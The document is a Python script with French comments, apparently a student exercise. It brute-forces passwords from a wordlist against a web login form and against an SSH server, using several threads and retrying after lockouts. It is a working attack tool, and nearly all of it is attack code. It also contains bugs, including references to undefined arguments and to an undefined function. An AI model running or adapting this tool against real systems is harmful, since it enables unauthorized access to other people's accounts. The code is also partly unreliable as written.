###########################################
#             Les librairies              #
###########################################
import os
import time
import socket
import asyncio
import requests
import argparse
import paramiko
from threading import Thread
from sys import breakpointhook
from colorama import Fore, Style
###########################################
#          Rajout des arguments           #
###########################################
parser = argparse.ArgumentParser(description="Un script qui mérite 20/20 pour pepe the frog")
parser.add_argument('-i', '--ip', action="store", dest="ip", help="Adresse de la machine à attaquer")
parser.add_argument('-p', '--url', action="store", dest="url", help="Mettre le chemin de la wordlist")
parser.add_argument('-w', '--wordlist', action="store", dest="wordlist", help="Lien vers la lister des mots de passe")
parser.add_argument("-t", "--thread", type=str, action="store", dest="nb_thread", help="Nombre de thread")
parser.add_argument('-u', '--username', action="store", dest="username", help="Nom de l'utilisateur")
###########################################
#        Définition des paramètres        #
###########################################
args = parser.parse_args()
if not args.url and not args.wordlist and not args.utilisateur and not args.password:
    print("Rentrez les arguments obligatoires - Try -h")
    exit()
if not args.url and not args.ip:
    print("Specify an url target")
    exit()
elif not args.wordlist:
    print("Donne une wordlist là")
    exit()
elif not args.username and not args.password:
    print("Donne un nom vite")
    exit()
elif not args.ip and not args.username:
    print("Donne son mdp 1")
    exit()  
###########################################
#        Définition des variables         #
###########################################
ip = args.ip
url = args.url
username = args.username
wordlist = args.wordlist
nb_thread = str(args.nb_thread)
###########################################
#             Bruteforce HTTP             #
###########################################
if not args.ip and args.url:
    def http(password):
        data = {'username':username, 'password':password}
        try:
            r = requests.post(url, data=data)
        except: 
            print("Site Indisponible")
            exit()
        if "Your username or password is incorrect." in r.text:
            print(Fore.RED + f"❌ Mauvais mot de passe : {password}" + Style.RESET_ALL)
        else:
            print(Fore.GREEN + f"🤠 Mot de passe trouvé !:\n\tURL: {url}\n\tUtilisateur: {username}\n\tMot de passe: {password}" + Style.RESET_ALL)
            os._exit(0)

    http_list = list()
    with open(wordlist, "r") as file:
        for line in file.readlines():
            password = line.strip()
            try:
                    threads_http = Thread(target=http, args=(password,))
                    http_list.append(threads_http)
                    time.sleep(0.2)
                    threads_http.start()

                    if len(http_list) >= int(nb_thread):
                        for threads_http in http_list:
                            threads_http.join()
                        http_list = list()
            except Exception as e:
                print(e)
###########################################
# SSH rentrer automatiquement la commande #
###########################################
if args.ip and not args.url:
    def ssh(password):
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(ip, username=username, password=password, timeout=3)
            except socket.timeout:
                print(Fore.RED + f"❌ Hôte indisponible : {ip} connexion impossible." + Style.RESET_ALL)
                os._exit(0)

            except paramiko.AuthenticationException:
                print(Fore.RED + f"❌  Mauvais mots de passe {username} :{password}")
                client.close()
            except paramiko.SSHException:
                print(Fore.BLUE + f"❌ Tentatives épuisées, tentatives dans 1 minute" + Style.RESET_ALL)
                client.close()
                time.sleep(60)
                return is_ssh_open(ip, username, password)
            else:
                # connection was established successfully
                print(Fore.GREEN + f"🦦 Found combo:\n\tHOSTNAME: {ip}\n\tUSERNAME: {username}\n\tPASSWORD: {password}" + Style.RESET_ALL)
                os._exit(0)
    ssh_list = list()
    with open(wordlist, "r") as file:
        for line in file.readlines():
            password = line.strip()
            try:
                    threads_ssh = Thread(target=ssh, args=(password,))
                    ssh_list.append(threads_ssh)
                    time.sleep(0.1)
                    threads_ssh.start()
                    if len(ssh_list) >= int(nb_thread):
                        for threads_ssh in ssh_list:
                            threads_ssh.join()
                        ssh_list = list()
            except Exception as erreur:
                print(erreur)